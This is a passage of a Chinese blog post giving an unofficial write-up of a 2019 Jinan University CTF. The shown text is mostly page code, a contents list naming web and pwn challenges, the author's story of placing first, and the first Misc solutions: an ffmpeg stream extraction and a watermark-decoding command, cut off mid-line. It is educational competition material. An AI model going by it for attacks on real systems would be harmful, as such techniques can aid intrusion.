<!doctype html><html lang="zh" style="display:none"><head><meta charset="utf-8"><script>window.materialVersion="1.5.6",window.oldVersion=["codestartv1","1.3.4","1.4.0","1.4.0b1","1.5.0","1.5.2","1.5.5"]</script><meta content="on" http-equiv="x-dns-prefetch-control"><link href="https://cdn.jsdelivr.net/gh/viosey/hexo-theme-material@latest/source" rel="dns-prefetch"><link href="https://busuanzi.ibruce.info" rel="dns-prefetch"><link href="https://cdn-city.livere.com" rel="dns-prefetch"><link href="https://lib.baomitu.com" rel="dns-prefetch"><meta content="IE=Edge,chrome=1" http-equiv="X-UA-Compatible"><meta content="webkit" name="renderer"><meta content="width=device-width,initial-scale=1,user-scalable=no" name="viewport"><title>2019 年暨南大学“新生杯”CTF Write-Up | 存在感消失的地方|ω•`)</title><link href="../../../../img/favicon.png" rel="icon shortcut" type="image/ico"><link href="../../../../img/favicon.png" rel="icon"><meta content="telephone=no" name="format-detection"><meta content="非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•&#39;-&#39;•) ✧" name="description" itemprop="description"><meta content="" name="keywords"><meta content="#e16b8c" name="theme-color"><meta content="no-transform" http-equiv="Cache-Control"><meta content="no-siteapp" http-equiv="Cache-Control"><!--[if lte IE 9]><link href="/css/ie-blocker.css" rel="stylesheet"><script src="/js/ie-blocker.zhCN.js"></script><![endif]--><script>window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}},lsloader.removeLS=function(e){try{localStorage.removeItem(e)}catch(e){}},lsloader.setLS=function(e,t){try{localStorage.setItem(e,t)}catch(e){}},lsloader.getLS=function(e){var t="";try{t=localStorage.getItem(e)}catch(e){t=""}return t},versionString="/*"+(window.materialVersion||"unknownVersion")+"*/",lsloader.clean=function(){try{for(var e=[],t=0;t<localStorage.length;t++)e.push(localStorage.key(t));e.forEach(function(e){var n=lsloader.getLS(e);window.oldVersion&&window.oldVersion.reduce(function(e,t){return e||-1!==n.indexOf("/*"+t+"*/")},!1)&&lsloader.removeLS(e)})}catch(e){}},lsloader.clean(),lsloader.load=function(e,t,n,s){var a;if("boolean"==typeof n&&(s=n,n=void 0),s=s||!1,n=n||function(){},(a=this.getLS(e))&&-1===a.indexOf(versionString))return this.removeLS(e),void this.requestResource(e,t,n,s);if(a){if(a.split(versionString)[0]!=t)return console.log("reload:"+t),this.removeLS(e),void this.requestResource(e,t,n,s);a=a.split(versionString)[1],s?(this.jsRunSequence.push({name:e,code:a}),this.runjs(t,e,a)):(document.getElementById(e).appendChild(document.createTextNode(a)),n())}else this.requestResource(e,t,n,s)},lsloader.requestResource=function(t,n,e,s){var a=this;s?this.iojs(n,t,function(e,t,n){a.setLS(t,e+versionString+n),a.runjs(e,t,n)}):this.iocss(n,t,function(e){document.getElementById(t).appendChild(document.createTextNode(e)),a.setLS(t,n+versionString+e)},e)},lsloader.iojs=function(e,t,n){var s=this;s.jsRunSequence.push({name:t,code:""});try{var a=new XMLHttpRequest;a.open("get",e,!0),a.onreadystatechange=function(){if(4==a.readyState){if((200<=a.status&&a.status<300||304==a.status)&&""!=a.response)return void n(e,t,a.response);s.jsfallback(e,t)}},a.send(null)}catch(n){s.jsfallback(e,t)}},lsloader.iocss=function(e,t,n,s){var a=this;try{var o=new XMLHttpRequest;o.open("get",e,!0),o.onreadystatechange=function(){if(4==o.readyState){if((200<=o.status&&o.status<300||304==o.status)&&""!=o.response)return n(o.response),void s();a.cssfallback(e,t,s)}},o.send(null)}catch(n){a.cssfallback(e,t,s)}},lsloader.iofonts=function(e,t,n,s){var a=this;try{var o=new XMLHttpRequest;o.open("get",e,!0),o.onreadystatechange=function(){if(4==o.readyState){if((200<=o.status&&o.status<300||304==o.status)&&""!=o.response)return n(o.response),void s();a.cssfallback(e,t,s)}},o.send(null)}catch(n){a.cssfallback(e,t,s)}},lsloader.runjs=function(e,t,n){if(t&&n)for(var s in this.jsRunSequence)this.jsRunSequence[s].name==t&&(this.jsRunSequence[s].code=n);if(this.jsRunSequence[0]&&this.jsRunSequence[0].code&&"failed"!=this.jsRunSequence[0].status)(a=document.createElement("script")).appendChild(document.createTextNode(this.jsRunSequence[0].code)),a.type="text/javascript",document.getElementsByTagName("head")[0].appendChild(a),this.jsRunSequence.shift(),0<this.jsRunSequence.length&&this.runjs();else if(this.jsRunSequence[0]&&"failed"==this.jsRunSequence[0].status){var a,o=this;(a=document.createElement("script")).src=this.jsRunSequence[0].path,a.type="text/javascript",this.jsRunSequence[0].status="loading",a.onload=function(){o.jsRunSequence.shift(),0<o.jsRunSequence.length&&o.runjs()},document.body.appendChild(a)}},lsloader.tagLoad=function(e,t){this.jsRunSequence.push({name:t,code:"",path:e,status:"failed"}),this.runjs()},lsloader.jsfallback=function(e,t){if(!this.jsnamemap[t]){for(var n in this.jsnamemap[t]=t,this.jsRunSequence)this.jsRunSequence[n].name==t&&(this.jsRunSequence[n].code="",this.jsRunSequence[n].status="failed",this.jsRunSequence[n].path=e);this.runjs()}},lsloader.cssfallback=function(e,t,n){if(!this.cssnamemap[t]){this.cssnamemap[t]=1;var s=document.createElement("link");s.type="text/css",s.href=e,s.rel="stylesheet",s.onload=s.onerror=n;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(s,a)}},lsloader.runInlineScript=function(e,t){var n=document.getElementById(t).innerText;this.jsRunSequence.push({name:e,code:n}),this.runjs()}</script><script>function Queue(){this.dataStore=[],this.offer=function(e){this.debug&&console.log("Offered a Queued Function."),"function"==typeof e?this.dataStore.push(e):console.log("You must offer a function.")},this.poll=function(){return this.debug&&console.log("Polled a Queued Function."),this.dataStore.shift()},this.execNext=function(){var e=this.poll();void 0!==e&&(this.debug&&console.log("Run a Queued Function."),e())},this.debug=!1,this.startDebug=function(){this.debug=!0}}var queue=new Queue</script><style id="material_css"></style><script>void 0===window.lsLoadCSSMaxNums&&(window.lsLoadCSSMaxNums=0),window.lsLoadCSSMaxNums++,lsloader.load("material_css","https://cdn.jsdelivr.net/gh/viosey/hexo-theme-material@latest/source/css/material.min.css",function(){void 0===window.lsLoadCSSNums&&(window.lsLoadCSSNums=0),window.lsLoadCSSNums++,window.lsLoadCSSNums==window.lsLoadCSSMaxNums&&(document.documentElement.style.display="")},!1)</script><style id="style_css"></style><script>void 0===window.lsLoadCSSMaxNums&&(window.lsLoadCSSMaxNums=0),window.lsLoadCSSMaxNums++,lsloader.load("style_css","https://cdn.jsdelivr.net/gh/viosey/hexo-theme-material@latest/source/css/style.min.css",function(){void 0===window.lsLoadCSSNums&&(window.lsLoadCSSNums=0),window.lsLoadCSSNums++,window.lsLoadCSSNums==window.lsLoadCSSMaxNums&&(document.documentElement.style.display="")},!1)</script><style>body,html{overflow-x:hidden!important}@font-face{font-family:'Noto Sans CJK SC';font-style:normal;font-weight:100;src:local('Noto Sans CJK SC Thin'),local('Source Han Sans SC ExtraLight'),local('Source Han Sans CN ExtraLight')}@font-face{font-family:'Noto Sans CJK SC';font-style:normal;font-weight:300;src:local('Noto Sans CJK SC Light'),local('Source Han Sans SC Light'),local('Source Han Sans CN Light')}@font-face{font-family:'Noto Sans CJK SC';font-style:normal;font-weight:400;src:local('Noto Sans CJK SC Regular'),local('Source Han Sans SC Regular'),local('Source Han Sans CN Regular')}@font-face{font-family:'Noto Sans CJK SC';font-style:normal;font-weight:500;src:local('Noto Sans CJK SC Medium'),local('Source Han Sans SC Medium'),local('Source Han Sans CN Medium')}@font-face{font-family:'Noto Sans CJK SC';font-style:normal;font-weight:700;src:local('Noto Sans CJK SC Bold'),local('Source Han Sans SC Bold'),local('Source Han Sans CN Bold')}@font-face{font-family:'Noto Sans CJK SC';font-style:normal;font-weight:900;src:local('Noto Sans CJK SC Black'),local('Source Han Sans SC Heavy'),local('Source Han Sans CN Heavy')}.mdl-badge[data-badge]:after,.mdl-button,.mdl-layout-title,.mdl-layout__drawer-button,blockquote,body,h1,h1 small,h2,h2 small,h3,h3 small,h4,h4 small,h5,h5 small,h6,h6 small,html{font-family:Roboto,"Helvetica Neue",Helvetica,"Noto Sans CJK SC","PingFang SC","Hiragino Sans GB","Microsoft YaHei","微软雅黑",Arial,sans-serif}code{font-family:"YaHei Consolas Hybrid",Consolas,Monaco,'Andale Mono','Ubuntu Mono',monospace}#post-content a{color:#db4d6d;position:relative;text-decoration:none}#post-content a:after{content:"";width:0;height:1px;background:#db4d6d;position:absolute;top:100%;left:50%;transition:all .2s}#post-content a:hover:after{left:0;width:100%}video{width:100%;border-radius:4px}kbd{background-color:#fafbfc;border:1px solid #c6cbd1;border-bottom-color:#959da5;border-radius:3px;box-shadow:inset 0 -1.5px 0 #959da5;font-size:75%;color:#444d56;padding:0 5px;padding-bottom:3px;vertical-align:middle;cursor:pointer}kbd:hover{color:#000}kbd:active{color:#000;box-shadow:inset 0 .5px 0 #666}#scheme-Paradox .hot_tags-count,#scheme-Paradox .sidebar-colored .sidebar-badge,#scheme-Paradox .sidebar-colored .sidebar-header,#scheme-Paradox .sidebar_archives-count,#search-form-label:after,#search-label,.mdl-card__media{background-color:#e16b8c!important}#scheme-Paradox .sidebar-colored .sidebar-badge{border-radius:4px}#scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus,#scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover{color:#e16b8c!important}#ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a,#post_entry-right-info,.sidebar-colored .sidebar-nav li:hover>a,.sidebar-colored .sidebar-nav li:hover>a i,.sidebar-colored .sidebar-nav li>a:focus i,.sidebar-colored .sidebar-nav li>a:hover,.sidebar-colored .sidebar-nav li>a:hover i,.sidebar-colored .sidebar-nav>.open>a,.sidebar-colored .sidebar-nav>.open>a:focus,.sidebar-colored .sidebar-nav>.open>a:hover{color:#e16b8c!important}.toTop{background:#757575!important}.material-layout .material-index>.material-nav,.material-layout .material-post>.material-nav,.material-nav a{color:#757575}#scheme-Paradox .MD-burger-layer{background-color:#757575}#scheme-Paradox #post-toc-trigger-btn{color:#757575;display:block}.post-toc a:hover{color:#db4d6d;text-decoration:underline}#post-content,#post-content p{color:rgba(0,0,0,.8)!important}pre.prettyprint>ol{white-space:pre!important;overflow-x:auto!important}.copy-button{float:right;border:none;color:#fff;background-color:transparent;margin-top:8px}.medium-zoom-image.medium-zoom-image--opened,.medium-zoom-overlay{z-index:500;filter:none!important}#post-content img{display:block;margin:0 auto;max-width:calc(100% - 16px)!important;max-height:480px;box-shadow:0 3px 3px -2px rgba(0,0,0,.2),0 3px 4px 0 rgba(0,0,0,.14),0 1px 8px 0 rgba(0,0,0,.12);transition:box-shadow .25s cubic-bezier(.4,0,.2,1)!important}#post-content img:hover{box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}#author-avatar>img,.sidebar-image>img{transition:transform .4s ease!important}#author-avatar>img:hover,.sidebar-image>img:hover{transform:rotate(360deg)}</style><style>body{background-color:#f5f5f5}#scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{background-color:#fff}</style><style>.fade{transition:all .8s linear;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);opacity:1}.fade.out{opacity:0}</style><style>@font-face{font-family:Roboto;font-style:normal;font-weight:300;src:url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-300.eot);src:local('Roboto'),local('Roboto-Normal'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-300.eot?#iefix) format('embedded-opentype'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-300.woff2) format('woff2'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-300.woff) format('woff'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-300.ttf) format('truetype'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-300.svg#Roboto) format('svg')}@font-face{font-family:Roboto;font-style:normal;font-weight:regular;src:url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-regular.eot);src:local('Roboto'),local('Roboto-Normal'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-regular.eot?#iefix) format('embedded-opentype'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-regular.woff2) format('woff2'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-regular.woff) format('woff'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-regular.ttf) format('truetype'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-regular.svg#Roboto) format('svg')}@font-face{font-family:Roboto;font-style:normal;font-weight:500;src:url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-500.eot);src:local('Roboto'),local('Roboto-Normal'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-500.eot?#iefix) format('embedded-opentype'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-500.woff2) format('woff2'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-500.woff) format('woff'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-500.ttf) format('truetype'),url(https://lib.baomitu.com/fonts/roboto/roboto-v15-latin-500.svg#Roboto) format('svg')}</style><style id="material_icons"></style><script>void 0===window.lsLoadCSSMaxNums&&(window.lsLoadCSSMaxNums=0),window.lsLoadCSSMaxNums++,lsloader.load("material_icons","https://cdn.jsdelivr.net/gh/viosey/hexo-theme-material@latest/source/css/material-icons.css",function(){void 0===window.lsLoadCSSNums&&(window.lsLoadCSSNums=0),window.lsLoadCSSNums++,window.lsLoadCSSNums==window.lsLoadCSSMaxNums&&(document.documentElement.style.display="")},!1)</script><link href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/vs2015.min.css" rel="stylesheet"><style>pre{background-color:#1e1e1e!important;font-size:15px!important}.hljs{margin:0!important;padding-left:0!important;line-height:1.5em!important;list-style:none!important;counter-reset:item}.hljs:not(.plaintext)>li:before{content:counter(item);counter-increment:item;display:inline-block;text-align:right;min-width:2em;margin-right:1em;color:#2b91af}.hljs-comment{font-style:normal}</style><script>lsloader.load("jq_js","https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js",!0)</script><meta content="yes" name="mobile-web-app-capable"><meta content="存在感消失的地方|ω•`)" name="application-name"><meta content="https://akarin.dev" name="msapplication-starturl"><meta content="#e16b8c" name="msapplication-navbutton-color"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="存在感消失的地方|ω•`)" name="apple-mobile-web-app-title"><meta content="black" name="apple-mobile-web-app-status-bar-style"><link href="../../../../img/favicon.png" rel="apple-touch-icon"><link href="/atom.xml" rel="alternate" type="application/atom+xml"><meta content="https://akarin.dev" property="og:url"><meta content="blog" property="og:type"><meta content="2019 年暨南大学“新生杯”CTF Write-Up | 存在感消失的地方|ω•`)" property="og:title"><meta content="../../../../img/favicon.png" property="og:image"><meta content="非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•&#39;-&#39;•) ✧" property="og:description"><meta content="Sat Nov 16 2019 21:50:28 GMT+0800" property="article:published_time"><meta content="Sat Nov 16 2019 21:50:28 GMT+0800" property="article:modified_time"><meta content="summary_large_image" name="twitter:card"><link href="https://akarin.dev" rel="canonical"><script type="application/ld+json">{ "@context": "https://schema.org", "@type": "BlogPosting", "mainEntityOfPage": "https://akarin.dev", "headline": "2019 年暨南大学“新生杯”CTF Write-Up", "datePublished": "Sat Nov 16 2019 21:50:28 GMT+0800", "dateModified": "Sat Nov 16 2019 21:50:28 GMT+0800", "author": { "@type": "Person", "name": "✨小透明・宸✨", "image": { "@type": "ImageObject", "url": "/img/avatar.jpg" }, "description": "身处寒夜 把握星光✨" }, "publisher": { "@type": "Organization", "name": "存在感消失的地方|ω•`)", "logo": { "@type":"ImageObject", "url": "/img/favicon.png" } }, "keywords": "", "description": "非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•&#39;-&#39;•) ✧", }</script><link href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" rel="stylesheet"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><meta content="Hexo 4.2.0" name="generator"><meta content="Hexo 4.2.0" name="generator"></head><body class="lazy" id="scheme-Paradox"><div class="has-drawer is-upgraded material-layout mdl-js-layout"><main class="material-layout__content" id="main"><div id="top"></div><button class="MD-burger-icon sidebar-toggle"><span class="MD-burger-layer" id="MD-burger-id"></span></button> <button class="mdl-button mdl-button--icon mdl-js-button" id="post-toc-trigger-btn"><i class="material-icons">format_list_numbered</i></button><ul class="mdl-js-ripple-effect mdl-js-menu mdl-menu mdl-menu--bottom-left post-toc-wrap" for="post-toc-trigger-btn" style="max-height:80vh;overflow-y:scroll"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a href="#Misc" class="post-toc-link"><span class="post-toc-number">1.</span> <span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a href="#O-N-E-O-F-U-S" class="post-toc-link"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">O N E O F U S</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#LoLo" class="post-toc-link"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">LoLo</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#wewuwewu" class="post-toc-link"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">wewuwewu</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#rainbow" class="post-toc-link"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">rainbow</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#NoMansLand" class="post-toc-link"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">NoMansLand</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#Music" class="post-toc-link"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">Music</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#carefully" class="post-toc-link"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">carefully</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#Guess" class="post-toc-link"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">Guess</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#nopan" class="post-toc-link"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">nopan</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a href="#Crypto" class="post-toc-link"><span class="post-toc-number">2.</span> <span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a href="#really-encrypted" class="post-toc-link"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">really_encrypted</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#easyrsa" class="post-toc-link"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">easyrsa</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#My-kingdom" class="post-toc-link"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">My kingdom</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#lincoin" class="post-toc-link"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">lincoin</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a href="#Reverse" class="post-toc-link"><span class="post-toc-number">3.</span> <span class="post-toc-text">Reverse</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a href="#easyRE" class="post-toc-link"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">easyRE</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#easyELF" class="post-toc-link"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">easyELF</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#reverseMe" class="post-toc-link"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">reverseMe</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a href="#Web" class="post-toc-link"><span class="post-toc-number">4.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a href="#BabyUpload" class="post-toc-link"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">BabyUpload</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#EasyUpload" class="post-toc-link"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">EasyUpload</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#EasyGame" class="post-toc-link"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">EasyGame</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#BabyPHP" class="post-toc-link"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">BabyPHP</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#EasyPHP" class="post-toc-link"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">EasyPHP</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#Babysql" class="post-toc-link"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">Babysql</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#SELECT-me-Easysql" class="post-toc-link"><span class="post-toc-number">4.7.</span> <span class="post-toc-text">SELECT_me! Easysql</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#Lottery" class="post-toc-link"><span class="post-toc-number">4.8.</span> <span class="post-toc-text">Lottery</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a href="#pwn" class="post-toc-link"><span class="post-toc-number">5.</span> <span class="post-toc-text">pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a href="#babyrip" class="post-toc-link"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">babyrip</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#babyrop" class="post-toc-link"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">babyrop</span></a></li><li class="post-toc-item post-toc-level-2"><a href="#babystack" class="post-toc-link"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">babystack</span></a></li></ol></li></ol></ul><div class="material-post_container"><div class="material-post mdl-grid"><div class="mdl-cell mdl-cell--12-col mdl-card mdl-shadow--4dp"><div class="mdl-color-text--grey-50 mdl-card__media post_thumbnail-custom" style="background:linear-gradient(rgba(0,0,0,0) 50%,rgba(0,0,0,.5)),url(https://ae01.alicdn.com/kf/H4f96579cce3f4cfdb3ba757207bd95daK.jpg) center;background-size:cover"><p class="article-headline-p">2019 年暨南大学“新生杯”CTF Write-Up</p></div><div class="mdl-card__supporting-text mdl-color-text--grey-700 meta"><div id="author-avatar"><img src="../../../../img/avatar.jpg" alt="Author Avatar" height="44px" width="44px"></div><div><strong>✨小透明・宸✨</strong> <span>2019-11-16 21:50:28</span></div><div class="section-spacer"></div><button class="mdl-js-ripple-effect mdl-button mdl-button--icon mdl-js-button" id="article-functions-qrcode-button"><i class="material-icons" role="presentation">devices other</i> <span class="visuallyhidden">devices other</span></button><ul class="mdl-js-ripple-effect mdl-js-menu mdl-menu mdl-menu--bottom-right" for="article-functions-qrcode-button" style="text-align:center"><li class="mdl-menu__item" style="text-align:center">在其它设备中阅读本文章</li><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAAAAABQV18IAAAB2UlEQVR42u3bwZKDIBCEYd//pbOXPRhLun9YD9LbXhITop9VozADOT4v3I6iiiqqqBvUIbZrm/P+18F+90ev+DxFxaBug+7m8/NBru9tEIPzFJWFugaeClYV5KP37jxF/S+UC1J3UxRVlAtgcjLarqhclAtiNWBz7R8fJRT1epQa0D/5+lg2U9SrUWTArzrc0Xc0oViquhT1apQKxJUHqUosVLuiMlGjwsUI4YoYo0QWF82KikCNDkID212ETGCLikCRDtQNAF0gu6SjqCwUeUAShAt29+AtKgvlBnfqgOomIBMDOEMuaiuUGuirz2eTC3uBRcWiaNECn0wkqUXloWgnPFtYpROashBb1JYoV/ByHbUa9P2pwFHU1ihS0B8FsmtHiiZF5aHc4htSrFULJtzkY1FZKPVD9eAjBVualBaVhVpZPEo7Ylo4KSoTpQKaJARPTDYVlYUiD82ZCSa6uKKobNRU4njwP2SQjr6oHBRZKEgKsKRztzdWUREomizSYitJcKcLHEVth3IB7tqsXhxKHIraFjVbOHNFNDexhAscRcWiSHJAFxROjTyLikU5LJ1IkgPKoqJQqrOdmeReXXBYVBaKLKSZ2Se42/2iIlBv2ooqqqiiTtsPWpMQr85kHOcAAAAASUVORK5CYII="></ul><button class="mdl-js-ripple-effect mdl-button mdl-button--icon mdl-js-button" id="article-fuctions-share-button"><i class="material-icons" role="presentation">share</i> <span class="visuallyhidden">share</span></button><ul class="mdl-js-ripple-effect mdl-js-menu mdl-menu mdl-menu--bottom-right" for="article-fuctions-share-button"><a href="http://service.weibo.com/share/share.php?appkey=&title=2019 年暨南大学“新生杯”CTF Write-Up&url=https://akarin.dev&pic=https://akarin.dev/img/favicon.png&searchPic=false&style=simple" class="post_share-link" target="_blank"><li class="mdl-menu__item">分享到微博</li></a><a href="http://connect.qq.com/widget/shareqq/index.html?site=存在感消失的地方|ω•`)&title=2019 年暨南大学“新生杯”CTF Write-Up&summary=&pics=https://akarin.dev/img/favicon.png&url=https://akarin.dev" class="post_share-link" target="_blank"><li class="mdl-menu__item">分享到 QQ</li></a></ul></div><div class="mdl-card__supporting-text mdl-color-text--grey-700 fade out" id="post-content"><div class="aplayer aplayer-tag-marker" style="margin-bottom:20px" id="aplayer-ItiSfPgh"><pre class="aplayer-lrc-content"></pre></div><script>var ap=new APlayer({element:document.getElementById("aplayer-ItiSfPgh"),narrow:!1,autoplay:!1,showlrc:!1,music:{title:"START：DASH！！",author:"μ's",url:"https://files.catbox.moe/hxkmbz.m4a",pic:"https://ae01.alicdn.com/kf/HTB1W51WNwHqK1RjSZFkq6x.WFXau.jpg",lrc:""}});window.aplayers||(window.aplayers=[]),window.aplayers.push(ap)</script><p>最近因为各种杂七杂八的事情忙到爆炸，很久都没有更新文章了，被 CTF 折腾也是忙到爆炸的原因之一_(:_」∠)_</p><p>这个比赛其实去年小透明参加过，然鹅因为当时<del>姿势水平不足</del>，结果只能在六七十名的后排位置看菊苣们刷分。</p><p>（重在参与，重在参与！）</p><img data-src="https://ae01.alicdn.com/kf/H30ab574d7d16485192a29e82f4d642adB.jpg" data-webp-src="https://ae01.alicdn.com/kf/H6acc1bb67c93432fa5010866066df1ecU.jpg"><p>一年过去了，小透明似乎还是一直都没有真正意义上地“特训”过 CTF（只是在开始前一周把某在线题库的“新手区”过了一遍），结果在比赛前夕突然听说了班上有某君<strong>从暑假开始，每天练习一道 CTF 题</strong>，还是门槛相对较高的<strong>逆向题</strong>的消息，再想到各种“聚沙成塔”“坚持不懈”“不劳无获”“龟兔赛跑”之类的鸡汤……</p><p>由于竞争的存在，小透明参赛的动机开始<del>被一点点地扭曲</del>(｡í _ ì｡) 从一开始的<strong>“过来玩一玩”</strong>变成了各种<strong>“不能被○○超过了”</strong>，到了最后目标变成了<strong>“尝试超过那位已从本校计科专业毕业的传说级菊苣”</strong>，结果就是小透明在这一周用尽了几乎所有的精力来肝比赛，然后……</p><img data-src="https://ae01.alicdn.com/kf/Ub97ca8e264c64830a051ff01093953eeZ.png" data-webp-src="https://ae01.alicdn.com/kf/Hde8e238f05be46f78c86bba330ce34a1t.jpg"><p>虽然得了第一位，但是大概是因为太累了，还有天气变化的关系，结果在比赛进行到后期的时候似乎是感冒了……果然还是不应该勉强自己，周末坐校车回家时头又疼又晕的感觉太难受了ﾍ(‘.’o)（虽然现在已经没那么不舒服啦）</p><p>这是个<strong>非官方</strong>的 Write-Up，内容<strong>仅限于自己当时做出来的部分题目</strong>。官方版的 Write-Up 应该会在<a href="http://blog.leanote.com/xp0int" target="_blank" rel="noopener">主办方 Xp0int 的博客</a>上更新，不过小透明本来就有打算自己写一份放在这里，至少当成一个记录好了～٩(ˊᗜˋ*)و</p><blockquote><p><a href="http://blog.leanote.com/post/xp0int/2019%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A6-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup" target="_blank" rel="noopener">官方 Write-Up</a> 已放出，相比这里的非官方 Write-Up 多出了以下题目的题解：</p><ul><li>Misc<ul><li>orzzzxzz</li></ul></li><li>Reverse<ul><li>binary</li></ul></li><li>Web<ul><li>Image Checker</li><li>unserialize</li></ul></li><li>pwn<ul><li>inversion</li><li>syscall</li></ul></li></ul><p>↑都是当时不会做的题（笑）</p><p>另外也公布了题目源码和附件：<a href="https://github.com/xf1les/2019JNUCTF" target="_blank" rel="noopener">xf1les/2019JNUCTF</a></p></blockquote><p><em>题目实在太多了，可以点击左边的“目录”菜单，直接传送到某个题目的 Write-Up～</em></p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="O-N-E-O-F-U-S"><a href="#O-N-E-O-F-U-S" class="headerlink" title="O N E O F U S"></a>O N E O F U S</h2><p>不知道为什么，MPC-HC 直接打开视频本体就是 flag 了，<del>所以这题白给 2333</del></p><img data-src="https://ae01.alicdn.com/kf/Uc2c1b990d10d43fea4e29c238fc781c7e.png" data-webp-src="https://ae01.alicdn.com/kf/Ha4981586fa5b48a982b7a972168ec1d6R.jpg"><p>正经的解法：这个 MKV 有两个视频流，flag 藏在某个视频流里面，使用 FFmpeg 就可以把这个流单独拆出来。</p><pre><code class="bash">ffmpeg -i oneofus.mkv -map 0:2 -c copy oneofus.jpg</code></pre><h2 id="LoLo"><a href="#LoLo" class="headerlink" title="LoLo"></a>LoLo</h2><p>蓝色盲水印，出门右转：<a href="https://github.com/linyacool/blind-watermark/tree/python3" target="_blank" rel="noopener">GitHub linyacool/blind-watermark</a></p><pre><code class="bash">decode.py --original lolo_1.png --image 